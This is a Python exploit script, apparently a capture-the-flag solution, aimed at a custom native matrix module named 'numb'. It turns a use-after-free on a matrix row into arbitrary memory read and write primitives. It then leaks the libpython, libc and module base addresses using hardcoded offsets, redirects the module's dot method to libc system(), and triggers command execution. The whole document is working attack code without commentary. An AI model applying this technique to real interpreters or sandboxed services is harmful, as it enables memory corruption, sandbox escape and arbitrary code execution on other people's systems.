import numb
import struct


def int64_to_float(n: int) -> float:
    return struct.unpack("d", struct.pack("Q", n))[0]


def float_to_int64(n: float) -> int:
    return struct.unpack("Q", struct.pack("d", n))[0]


a = numb.Matrix([[0.0] * 1337])
row = a.get_row(0)
del a
matrix = numb.Matrix([[0.0]] * 1337)


def memory_read(address: int) -> int:
    global row
    global int64_to_float
    global float_to_int64
    global struct
    row[0] = int64_to_float(address)
    return float_to_int64(matrix[0, 0])


def memory_write(address: int, value: int) -> int:
    global row, matrix
    global int64_to_float
    global float_to_int64
    global struct
    row[0] = int64_to_float(address)
    matrix[0, 0] = int64_to_float(value)


def func():
    pass


FUNCTION_TYPE_OFFSET = 0x5DE140
MALLOC_GOT_OFFSET = 0x4E49C0
SYSTEM_OFFSET = 0x4C490
MALLOC_OFFSET = 0x98870
MATRIX_TYPE_OFFSET = 0x6680
MATRIX_DOT_METHOD_DEF_OFFSET = 0x62C0 + 8
function_type = memory_read(id(func) + 8)
libpython_base = function_type - FUNCTION_TYPE_OFFSET
print("LIBPYTHON LEAK", hex(libpython_base))
malloc = memory_read(libpython_base + MALLOC_GOT_OFFSET)
libc_base = malloc - MALLOC_OFFSET
print("LIBC LEAK", hex(libc_base))
m = numb.Matrix([[1.0]])
matrix_type = memory_read(id(m) + 8)
numb_base = matrix_type - MATRIX_TYPE_OFFSET
print("NUMB LEAK", hex(numb_base))
memory_write(numb_base + MATRIX_DOT_METHOD_DEF_OFFSET, libc_base + SYSTEM_OFFSET)
memory_write(id(m), struct.unpack("Q", b"rh".ljust(8, b"\x00"))[0])
m.dot()
